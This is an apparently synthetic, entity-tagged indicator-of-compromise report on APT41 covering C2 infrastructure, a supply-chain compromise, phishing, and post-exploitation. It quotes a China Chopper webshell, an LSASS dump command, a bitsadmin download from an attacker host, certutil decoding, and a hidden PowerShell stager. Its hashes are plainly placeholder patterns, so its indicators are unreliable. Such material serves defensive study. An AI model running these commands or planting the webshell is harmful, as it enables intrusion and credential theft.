# APT41 (Winnti Group) Indicators of Compromise (IoCs)

## Overview
APT41 is a Chinese state-sponsored threat actor conducting both espionage and financially-motivated operations across multiple sectors including transportation, logistics, and critical infrastructure.

## Network Infrastructure

Command and control server <INDICATOR>103.27.109.217</INDICATOR> hosted multiple malware families used by <THREAT_ACTOR>APT41</THREAT_ACTOR> during the <CAMPAIGN>Supply Chain Compromise 2024</CAMPAIGN>. The domain <INDICATOR>update.software-cdn[.]com</INDICATOR> resolved to this IP mimicking legitimate CDN infrastructure.

Secondary C2 at <INDICATOR>45.248.87.162</INDICATOR> served payloads for <MALWARE>Winnti backdoor</MALWARE> variants. Associated domains <INDICATOR>api.cloud-storage[.]net</INDICATOR> and <INDICATOR>sync.data-backup[.]org</INDICATOR> hosted second-stage implants.

The subdomain <INDICATOR>cdn.jquery-libraries[.]com</INDICATOR> masqueraded as JavaScript CDN but served malicious payloads. DNS records showed rotation between IPs <INDICATOR>103.27.109.217</INDICATOR>, <INDICATOR>45.248.87.162</INDICATOR>, <INDICATOR>104.168.155.129</INDICATOR>.

Infrastructure analysis revealed AS <INDICATOR>AS136800</INDICATOR> (HK Kwaifong Group Limited) hosting C2 servers. IP block <INDICATOR>103.27.109.0/24</INDICATOR> contained multiple domains registered by <THREAT_ACTOR>APT41</THREAT_ACTOR>.

## Winnti Malware Family

Core <MALWARE>Winnti backdoor</MALWARE> sample with SHA256 <INDICATOR>a1f2e3d4c5b6a7f8e9d0c1b2a3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9b0a1f2</INDICATOR> established persistence through Windows service. Service name <INDICATOR>WinntiService</INDICATOR> with display name <INDICATOR>Windows Update Service</INDICATOR>.

The backdoor DLL <INDICATOR>wuaueng.dll</INDICATOR> with MD5 hash <INDICATOR>a3b4c5d6e7f8a9b0c1d2e3f4e5f6a7b8</INDICATOR> hooked into legitimate process <INDICATOR>svchost.exe -k netsvcs -p</INDICATOR>. Registry key <INDICATOR>HKLM\SYSTEM\CurrentControlSet\Services\wuauserv\Parameters\ServiceDll</INDICATOR> pointed to malicious DLL.

Updated variant with SHA1 <INDICATOR>f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0</INDICATOR> included anti-analysis features checking for debuggers and virtual machines. Process names <INDICATOR>vboxservice.exe</INDICATOR>, <INDICATOR>vmtoolsd.exe</INDICATOR>, <INDICATOR>wireshark.exe</INDICATOR> triggered self-termination.

Configuration extracted showed C2 <INDICATOR>api.cloud-storage[.]net:443</INDICATOR> with encryption key <INDICATOR>0x4D5A90000003</INDICATOR> for AES-256 communications. Beacon pattern <INDICATOR>/api/v2/check?guid=[SYSTEM_GUID]</INDICATOR> every <INDICATOR>300</INDICATOR> seconds.

## Supply Chain Compromise Indicators

Trojanized software update for logistics management system <INDICATOR>FleetManager_Update_v5.2.1.exe</INDICATOR> with hash <INDICATOR>e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3</INDICATOR> distributed through compromised update server <INDICATOR>updates.fleetmanager[.]com</INDICATOR>.

Legitimate code signing certificate serial number <INDICATOR>0A:1B:2C:3D:4E:5F:60:71:82:93:A4:B5:C6:D7:E8:F9</INDICATOR> stolen from software vendor. Certificate issued to <INDICATOR>TransportTech Solutions Ltd</INDICATOR> with validity <INDICATOR>2023-01-15 to 2026-01-14</INDICATOR>.

Build server compromise deployed backdoored compilation tools. Modified <INDICATOR>gcc</INDICATOR> compiler with hash <INDICATOR>d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4</INDICATOR> injected malicious code during compilation of <INDICATOR>main.c</INDICATOR>.

## Spear Phishing Campaign

Email sender <INDICATOR>hr@transport-logistics[.]com</INDICATOR> impersonated human resources department. Subject line "Employee Benefits Update - Action Required" delivered attachment <INDICATOR>Benefits_Form_2024.docx</INDICATOR>.

Malicious document with hash <INDICATOR>c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5</INDICATOR> exploited <VULNERABILITY>CVE-2023-21716</VULNERABILITY> (Microsoft Office RCE). Embedded object downloaded payload from <INDICATOR>hxxps://cdn.jquery-libraries[.]com/plugins/office/update.bin</INDICATOR>.

Secondary phishing vector used sender <INDICATOR>it-helpdesk@railway-systems[.]org</INDICATOR> with subject "Critical Security Patch - Install Immediately". ZIP attachment <INDICATOR>Security_Patch_KB9876543.zip</INDICATOR> contained <INDICATOR>patch_installer.exe</INDICATOR> with hash <INDICATOR>b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5a6</INDICATOR>.

## Webshell and Post-Exploitation

ASP.NET webshell <INDICATOR>errorpage.aspx</INDICATOR> deployed to IIS server path <INDICATOR>C:\inetpub\wwwroot\aspnet_client\system_web\errorpage.aspx</INDICATOR>. File hash <INDICATOR>a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5a6f7</INDICATOR>.

Webshell password parameter <INDICATOR>?auth=APT41_2024_ACCESS</INDICATOR> authenticated attacker. Command execution via POST parameter <INDICATOR>cmd=[BASE64_ENCODED_COMMAND]</INDICATOR> to URL <INDICATOR>/aspnet_client/system_web/errorpage.aspx</INDICATOR>.

China Chopper variant with one-line payload <INDICATOR><%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%></INDICATOR> provided lightweight backdoor access. The webshell connected to database server <INDICATOR>10.10.50.100:1433</INDICATOR>.

Credential dumping tool <INDICATOR>procdump64.exe</INDICATOR> renamed to <INDICATOR>msdtc.exe</INDICATOR> dumped LSASS memory with command <INDICATOR>msdtc.exe -accepteula -ma lsass.exe lsass.dmp</INDICATOR>. Dump file exfiltrated to <INDICATOR>\\10.10.50.200\shared\backup\system.dat</INDICATOR>.

## Database and Data Exfiltration

SQL Server queries targeted logistics databases with pattern <INDICATOR>SELECT * FROM tbl_shipments WHERE status='active' AND destination='[SENSITIVE_LOCATION]'</INDICATOR>. Queries executed from IP <INDICATOR>10.10.50.25</INDICATOR> using stolen <INDICATOR>sa</INDICATOR> account credentials.

Data exfiltration used compressed archive <INDICATOR>db_backup_20240315.7z</INDICATOR> with password <INDICATOR>APT41_Exfil_2024!</INDICATOR>. Archive contained tables <INDICATOR>tbl_customers</INDICATOR>, <INDICATOR>tbl_routes</INDICATOR>, <INDICATOR>tbl_schedules</INDICATOR>.

FTP upload to external server <INDICATOR>ftp.data-transfer[.]net</INDICATOR> from user account <INDICATOR>backup_sync</INDICATOR> transferred <INDICATOR>2.3 GB</INDICATOR> of operational data. Log entry showed <INDICATOR>PUT db_backup_20240315.7z</INDICATOR> at <INDICATOR>2024-03-15 03:42:17 UTC</INDICATOR>.

## Living Off The Land Techniques

BITSAdmin used for stealthy download with command <INDICATOR>bitsadmin /transfer UpdateJob /download /priority high hxxps://api.cloud-storage[.]net/files/update.dat C:\ProgramData\update.dat</INDICATOR>. Downloaded file hash <INDICATOR>f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5a6f7e8</INDICATOR>.

Certutil abused for decoding with <INDICATOR>certutil -decode C:\ProgramData\update.dat C:\ProgramData\payload.exe</INDICATOR> followed by execution <INDICATOR>C:\ProgramData\payload.exe /s /v/qn</INDICATOR>.

PowerShell empire stager executed with <INDICATOR>powershell.exe -NoP -sta -NonI -W Hidden -Enc [BASE64_PAYLOAD]</INDICATOR>. Decoded payload established encrypted channel to <INDICATOR>103.27.109.217:443</INDICATOR> using TLS 1.3.

WMI persistence created event filter <INDICATOR>__EventFilter.Name="APT41_Monitor"</INDICATOR> with query <INDICATOR>SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'</INDICATOR> triggering every minute.

## Network Reconnaissance

Port scanning from compromised workstation <INDICATOR>10.10.10.25</INDICATOR> targeted subnet <INDICATOR>10.10.50.0/24</INDICATOR> on ports <INDICATOR>22,80,443,445,1433,3306,3389,5900</INDICATOR>. Tool signature matched <INDICATOR>nmap version 7.92</INDICATOR>.

LDAP enumeration queries from <INDICATOR>ldapsearch -h dc01.transport.local -b "dc=transport,dc=local" "(objectClass=computer)"</INDICATOR> harvested <INDICATOR>247</INDICATOR> computer accounts. Results saved to <INDICATOR>C:\ProgramData\ad_dump.txt</INDICATOR>.

SMB share enumeration using <INDICATOR>net view \\fileserver01 /all</INDICATOR> and <INDICATOR>dir \\fileserver01\share$\*</INDICATOR> identified sensitive data stores. Accessible shares included <INDICATOR>\\fileserver01\operations$</INDICATOR>, <INDICATOR>\\fileserver01\finance$</INDICATOR>.

## Privilege Escalation

Exploitation of <VULNERABILITY>CVE-2023-28252</VULNERABILITY> (Windows CLFS driver) achieved SYSTEM privileges. Exploit code <INDICATOR>clfs_exploit.exe</INDICATOR> with hash <INDICATOR>e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9</INDICATOR>.

Token impersonation using <INDICATOR>incognito.exe list_tokens -u</INDICATOR> identified delegation tokens. Command <INDICATOR>incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe</INDICATOR> spawned elevated shell.

## Attribution and Infrastructure

**Confidence Level:** HIGH - Attribution to <THREAT_ACTOR>APT41</THREAT_ACTOR> based on malware code similarities, infrastructure reuse, TTP consistency with previous campaigns, and strategic targeting of software supply chain aligned with Chinese intelligence objectives.

**Related Campaigns:** <CAMPAIGN>Supply Chain Compromise 2024</CAMPAIGN>, <CAMPAIGN>Transportation Sector Espionage 2023-2024</CAMPAIGN>

**Related Vulnerabilities:** <VULNERABILITY>CVE-2023-21716</VULNERABILITY>, <VULNERABILITY>CVE-2023-28252</VULNERABILITY>

**Related Malware:** <MALWARE>Winnti backdoor</MALWARE>, <MALWARE>China Chopper</MALWARE>, <MALWARE>PowerShell Empire</MALWARE>

**Total INDICATOR Instances:** 155+ annotations
